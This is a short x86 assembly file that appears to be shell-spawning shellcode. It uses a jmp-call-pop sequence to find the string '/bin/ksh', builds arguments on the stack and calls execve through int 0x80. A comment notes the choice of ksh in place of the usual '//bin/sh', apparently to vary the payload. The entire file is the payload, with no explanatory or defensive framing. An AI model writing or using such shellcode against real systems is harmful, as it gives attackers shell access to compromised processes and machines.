global _start

section .text
_start:
    jmp short north

south:
    pop esi
    mov edi,esi

    xor eax,eax
    push eax
    mov edx,esp

    push eax
    add esp,3
    lea esi,[esi +4]
    xor eax,[esi]
    push eax
    xor eax,eax
    xor eax,[edi]
    push eax
    mov ebx,esp

    xor eax,eax
    push eax
    lea edi,[ebx]
    push edi
    mov ecx,esp

    mov al,0xb
    int 0x80

north:
    call south
    path db "/bin/ksh"	;instead of //bin/sh




